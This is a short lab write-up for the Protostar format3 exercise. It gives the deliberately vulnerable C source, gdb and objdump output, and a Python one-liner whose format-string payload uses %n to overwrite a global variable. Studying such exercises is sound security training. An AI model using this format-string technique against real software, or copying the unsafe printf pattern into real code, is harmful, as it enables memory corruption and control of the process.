#### Protostar Format3 

##### About
This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.  
  
This level is at /opt/protostar/bin/format3

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

We can try to use '%n' to write a byte a time or two byte a time.

##### Solution
```
$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target

$ echo 'AAAA' > /tmp/payload

$ gdb format3
......
(gdb) disas printbuffer
Dump of assembler code for function vuln:
0x08048454 <+0>:    push   %ebp
0x08048455 <+1>:    mov    %esp,%ebp
0x08048457 <+3>:    sub    $0x18,%esp
0x0804845a <+6>:    mov    0x8(%ebp),%eax
0x0804845d <+9>:    mov    %eax,(%esp)
0x08048460 <+12>:   call   0x804837c <printf@plt>
0x08048465 <+17>:   leave
0x08048466 <+18>:   ret
End of assembler dump
(gdb) b *0x08048460
Breakpoint 1 at 0x08048460: file format3/format3.c, line 10.
(gdb) r < /tmp/payload
Starting program: /opt/protostar/bin/format3 < /tmp/payload
Breakpoint 1, 0x08048460 in printbuffer (string=0xbffffb10 "AAAA\n") at format3/format3.c:10
(gdb) x/4x $esp
0xbffffae0:     0xbffffb10      0x00000000      0xbffffb10      0xb7fd7ff4
(gdb) x 0xbffffb10
0xbffffb10:     0x41414141
(gdb) p (0xbffffb10 - 0xbffffae0) / 4
$1 = 12
(gdb) quit

$ python -c 'print "\xf4\x96\x04\x08"+"\xf5\x96\x04\x08"+"\xf6\x96\x04\x08"+"%56x%12$n"+"%17x%13$n"+"%173x%14$n"' | ./format3
......
you have modified the target :)
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-format/#format-3>  
<http://louisrli.github.io/blog/2012/08/29/protostar-format0/>
